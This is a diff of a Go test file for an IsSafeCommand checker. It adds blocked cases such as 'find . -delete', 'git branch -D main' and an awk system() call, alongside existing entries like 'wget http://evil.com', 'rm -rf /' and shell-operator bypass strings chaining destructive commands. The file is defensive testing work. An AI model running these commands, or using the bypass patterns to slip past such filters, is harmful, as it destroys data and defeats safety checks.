@@ -78,6 +78,9 @@ func TestIsSafeCommand_Blocked(t *testing.T) {
 		"wget http://evil.com",
 		"env rm -rf /",
 		"sed -i 's/old/new/' file",
+		"find . -delete",
+		"git branch -D main",
+		"awk 'BEGIN { system(\"touch pwn\") }' /dev/null",
 	}
 	for _, cmd := range blocked {
 		if IsSafeCommand(cmd) {
@@ -89,7 +92,7 @@ func TestIsSafeCommand_Blocked(t *testing.T) {
 func TestIsSafeCommand_ShellOperatorBypass(t *testing.T) {
 	bypasses := []string{
 		"ls && rm -rf /",
-		"cat file.txt | rm -rf /",       // rm is not a safe command
+		"cat file.txt | rm -rf /", // rm is not a safe command
 		"echo foo; rm -rf /",
 		"ls || rm -rf /",
 		"echo $(rm -rf /)",
